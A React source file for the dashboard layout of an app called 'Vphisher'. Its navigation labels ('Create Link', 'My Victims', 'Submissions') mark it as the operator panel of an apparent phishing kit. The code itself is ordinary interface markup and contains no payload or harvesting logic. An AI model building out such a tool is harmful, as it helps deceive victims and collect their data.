
import { useState } from 'react';
import { Outlet, Link, useLocation } from 'react-router-dom';
import { useAuth } from '@/context/AuthContext';
import { logout } from '@/lib/auth';
import { Button } from '@/components/ui/button';
import { toast } from 'sonner';
import { useNavigate } from 'react-router-dom';
import { Avatar, AvatarFallback, AvatarImage } from '@/components/ui/avatar';
import { Sheet, SheetContent, SheetTrigger } from '@/components/ui/sheet';
import { LogOut, Link2, Film, Mail, Menu, Users } from 'lucide-react';

const navLinks = [
  { href: '/dashboard/create', label: 'Create Link', icon: Link2 },
  { href: '/dashboard/reels', label: 'My Victims', icon: Film },
  { href: '/dashboard/submissions', label: 'Submissions', icon: Users },
  { href: '/dashboard/connect-me', label: 'Connect Me', icon: Mail },
];

function SidebarContent() {
  const { user } = useAuth();
  const location = useLocation();

  return (
    <div className="flex h-full flex-col bg-gray-900 text-gray-400">
      <div className="flex flex-col items-center text-center p-6 border-b border-gray-800">
        <div className='flex items-center gap-3 justify-center mb-6'>
          <img src="/logo.png" alt="Vp" className="rounded-full w-12 h-12" />
          <div className='text-2xl font-bold text-white'>Vphisher</div>
        </div>
        <Avatar className="w-24 h-24 mb-4 border-4 border-gray-800">
          <AvatarImage src="/user.jpg" alt={user?.user_metadata.full_name} />
          <AvatarFallback className="text-2xl bg-gray-700 text-white">{user?.user_metadata.full_name?.charAt(0) || 'A'}</AvatarFallback>
        </Avatar>
        <h2 className="text-xl font-semibold text-white">{user?.user_metadata.full_name || 'Admin User'}</h2>
        <p className="text-sm text-gray-500">Administrator</p>
      </div>
      <nav className="flex-grow p-4 space-y-2">
        {navLinks.map((link) => (
          <Link
            key={link.href}
            to={link.href}
            className={`flex items-center gap-3 rounded-md px-4 py-3 text-base font-medium transition-all duration-200
            ${
              location.pathname.startsWith(link.href)
                ? 'bg-gray-800 text-white'
                : 'hover:bg-gray-800/50 hover:text-white'
            }`}>
            <link.icon className="h-5 w-5" />
            {link.label}
          </Link>
        ))}
      </nav>
      <div className="p-4 border-t border-gray-800">
        <Button
          variant="ghost"
          className="w-full flex items-center justify-start text-gray-400 hover:bg-gray-800/10 hover:text-white">
          Created by<a href='https://www.linkedin.com/in/vinaytz/' className="text-gray-300 font-semibold hover:text-blue-300 transition" target="_blank">Vinaytz</a> with 🤍
        </Button>
      </div>
    </div>
  );
}

export default function DashboardLayout() {
  const { setUser } = useAuth();
  const navigate = useNavigate();
  const location = useLocation();
  const [isSheetOpen, setIsSheetOpen] = useState(false);

  const handleLogout = async () => {
    try {
      await logout();
      setUser(null);
      toast.success('Logged out successfully!');
      navigate('/login');
    } catch (error: any) {
      toast.error(error.message || 'Failed to logout.');
    }
  };

  const getPageTitle = () => {
    const path = location.pathname.split('/').filter(Boolean);
    if (path.length < 2) return 'Dashboard';
    const pageName = navLinks.find(link => link.href.includes(path[1]))?.label;
    return pageName || 'Dashboard';
  };

  return (
    <div className="flex min-h-screen w-full bg-gray-950">
      {/* Desktop Sidebar */}
      <aside className="hidden md:block w-72 flex-shrink-0 bg-gray-900">
        <SidebarContent />
      </aside>

      <div className="flex flex-1 flex-col">
        {/* Header */}
        <header className="sticky top-0 z-30 flex h-16 items-center justify-between border-b border-gray-800 bg-gray-900/80 px-6 backdrop-blur-sm">
          <div className="flex items-center gap-4">
            {/* Mobile Sidebar Toggle */}
            <Sheet open={isSheetOpen} onOpenChange={setIsSheetOpen}>
              <SheetTrigger asChild className="md:hidden">
                <Button variant="ghost" size="icon" className="text-gray-300">
                  <Menu className="h-6 w-6" />
                </Button>
              </SheetTrigger>
              <SheetContent side="left" className="text-blue-100 w-72 p-0 bg-gray-900 border-r-0">
                <SidebarContent />
              </SheetContent>
            </Sheet>
            <h1 className="text-xl font-semibold text-gray-100">{getPageTitle()}</h1>
          </div>
          <div className="flex items-center gap-4">
            <Button
              onClick={handleLogout}
              variant="ghost"
              size="sm"
              className="text-gray-300 hover:bg-gray-800/50"
            >
              <LogOut className="mr-2 h-4 w-4" /> Logout
            </Button>
          </div>
        </header>

        {/* Main Content */}
        <main className="flex-1 overflow-y-auto p-6">
          <Outlet />
        </main>
      </div>
    </div>
  );
}
